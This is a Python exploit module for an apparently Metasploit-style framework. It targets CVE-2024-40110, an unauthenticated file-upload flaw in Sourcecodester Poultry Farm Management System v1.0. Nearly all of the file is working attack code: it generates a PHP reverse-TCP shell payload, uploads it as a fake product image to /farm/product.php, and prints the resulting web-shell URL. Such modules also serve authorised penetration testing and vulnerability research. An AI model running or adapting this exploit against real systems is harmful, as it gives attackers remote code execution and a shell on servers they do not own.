#######
# Module/Exploit: Poultry Farm Management System Unauthenticated RCE
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitModule(Exploit):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'License'  : 'Terasploit Framework License (BSD)',
                'Name'     : 'Poultry Farm Management System Unauthenticated RCE',
                'Module'   : Module.exploit,
                'Arch'     : Arch.PHP,
                "Platform" : Platform.PHP,
                'Payload'  : 'modules/payload/php/shell_reverse_tcp',
                'Author'  : [
                    'Charlie <rupture6.dev[at]gmail.com>',
                ],
                'Description' : [
                    'Sourcecodester Poultry Farm Management System v1.0 contains an',
                    'Unauthenticated Remote Code Execution (RCE) vulnerability via',
                    'the product image parameter at /farm/product.php.'
                ],
                'Reference' : [
                    'CVE-2024-40110',
                    'https://www.exploit-db.com/exploits/52053',
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-40110'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.new('rhost',['','yes','the remote host target (url)']),
            OptString.new('path',['/farm/','yes','url path to attempt the upload']),
        ])


    def exploit(self) -> tuple[str, bool]:
        payload, _ = Get.payload()
        target, path = self.OPT()
        self.ParseURL(target)
        
        shell = self.EncodeShell(payload.generate())
        rand = self.generate_random_name()
        Shell.new(f"{Target.scheme}://{Target.hostname}/{path.rstrip('/').lstrip('/')}/assets/img/productimages/{rand}.php")        

        try:
            exploit = HTTPClient.Request('post',
                url=f"{Target.scheme}://{Target.hostname}/{path.rstrip('/').lstrip('/')}/product.php",
                files={'productimage': (f'{rand}.php',shell,'application/x-php')},
                data={'category': 'CHICKEN','product': 'rce','price':'100','save':''},
                verify=False
            )
            
            if exploit.status_code in self.good_status_code():
                info_print (f'Shell uploaded: {Shell.get()}', type="GREEN")
                return 'session', True
            else:
                info_print (f'Exploit failed, status code: {exploit.status_code}',type='red')
                return 'session', False
            
        except Exception as error:
            info_print (error,type='red')
            return 'exception', True